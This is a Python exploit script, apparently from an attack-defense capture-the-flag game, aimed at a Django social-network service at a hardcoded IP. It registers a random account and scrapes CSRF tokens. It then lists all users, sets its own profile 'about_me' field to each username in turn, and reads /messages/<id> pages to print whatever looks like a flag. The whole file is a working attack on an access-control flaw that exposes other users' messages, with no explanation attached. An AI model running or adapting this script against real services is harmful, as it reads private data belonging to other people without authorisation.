#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re

#ip = sys.argv[1]
ip = '192.168.0.100'

s = requests.Session()

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

username = generator()
password = generator()
mail = ''.join(generator() + '@mail.ru')

csrf_token = ''
users = []
links = []

def register_user(s, status=1):
    html = s.get('http://{}:8000/register'.format(ip)).text
    csrf_token = re.search('<input type=\'hidden\' name=\'csrfmiddlewaretoken\' value=\'(.*)\'\s?\/>', html).group(1)
    auth = {
        'csrfmiddlewaretoken':csrf_token,
        'email' : mail,
        'name' : username,
        'pass' : password,
        'status' : status,
        'terms' : 1
    }
    #print(mail)
    #print(password)
    answer = s.post('http://{}:8000/register'.format(ip), data=auth).text
    #print(html)
    return s

def set_image(s):
    html = s.get('http://{}:8000/profile/pic_edit'.format(ip)).text
    csrf_token = re.search('<input type=\'hidden\' name=\'csrfmiddlewaretoken\' value=\'(.*)\'\s?\/>', html).group(1)
    files = {'picture': open('image.png', 'rb')}
    data = {'csrfmiddlewaretoken': csrf_token,
            'form' : 'submit'}

    html = s.post('http://{}:8000/profile/pic_edit'.format(ip),files=files,data=data)
    #print(html)
    return s

def search_users(s):
    html = s.get('http://{}:8000/search'.format(ip)).text
    csrf_token = re.search('<input type=\'hidden\' name=\'csrfmiddlewaretoken\' value=\'(.*)\'\s?\/>', html).group(1)

    html = s.post('http://{}:8000/search'.format(ip), data={'search_text': '',
                                                            'csrfmiddlewaretoken': csrf_token,
                                                            'form' : 'submit'}).text
    users_links = re.findall('<td width="300"><a href="(.*)">(.*)<\/a><\/td>', html)
    for user in users_links:
        users.append(user[1])
        links.append(user[0])

    return s

def edit_profile(s,about_me):
    html = s.get('http://{}:8000/search'.format(ip)).text
    csrf_token = re.search('<input type=\'hidden\' name=\'csrfmiddlewaretoken\' value=\'(.*)\'\s?\/>', html).group(1)
    data = {'name' : username,
            'school': 1,
            'status' : 2,
            'sex': 'W',
            'hometown': '',
            'looking_for': '',
            'interested_for': '',
            'political_views': '',
            'interests': '',
            'clubs_and_jobs':'',
            'birthday':'1995-05-09',
            'favorite_books':'',
            'favorite_movies': '',
            'about_me':about_me,
            'form' : 'submit',
            'csrfmiddlewaretoken': csrf_token}
    html = s.post('http://{}:8000/profile/edit'.format(ip),data=data).text
    #print(html)
    return s

def show_messages(s, id):
    html  = s.get('http://{}:8000/messages/{}'.format(ip,id)).text
    flag = re.findall("<br>.*<b>(.*)<\/b>.*<br>",html,re.S)
    if flag:
        print(flag , flush=True)
    return s

register_user(s)
#set_image(s)
search_users(s)
for i in range(0,len(users)):
    edit_profile(s,users[i])
    id = re.search('\d',links[i]).group(0)
    show_messages(s, id)